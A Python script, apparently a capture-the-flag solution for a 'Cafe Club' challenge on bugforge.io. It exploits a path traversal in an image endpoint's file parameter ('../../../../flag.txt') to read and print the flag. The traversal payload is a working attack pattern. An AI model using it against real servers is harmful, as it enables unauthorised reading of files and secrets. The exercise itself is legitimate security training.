import requests
import argparse
'''
Author:-  0xmr
Platform:- bugforge.io
Python Automation Script for Cafe Club Challenge.
Date:- 02-March-2026
'''
# Example
# python3 cafe_club.py --url <url>

parser = argparse.ArgumentParser(
    prog='Cafe_CLub',description='This is a python script for cafe club challenge...',epilog='Thank you !!'
    )

parser.add_argument('--url', help="Target url", required=True)

args = parser.parse_args()

target_url = f"{args.url}".strip()
target_path= "api/product/image?file=/images/../../../../".strip()

url = f"{target_url}/{target_path}flag.txt"

print(f"[*] Reading flag:-  {url}")

session  = requests.Session()
response = session.get(url)
raw = response.text.strip()

print("[*] Flag")
print("=" * 120)
print(raw)
print("=" * 120)
print("Done !!!")
